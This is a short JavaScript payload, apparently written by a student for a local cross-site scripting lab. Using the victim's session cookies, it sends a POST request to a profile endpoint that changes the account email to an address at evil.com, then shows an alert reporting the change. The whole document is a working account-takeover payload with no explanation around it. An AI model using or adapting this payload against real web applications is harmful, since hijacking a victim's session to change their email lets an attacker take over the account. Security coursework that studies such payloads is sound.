fetch("http://127.0.0.1:5000/profile", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "email=hacked-by-35498420@evil.com",
  credentials: "include"
}).then(function () {
  alert("XSS: account email changed by external payload (student 35498420)");
});
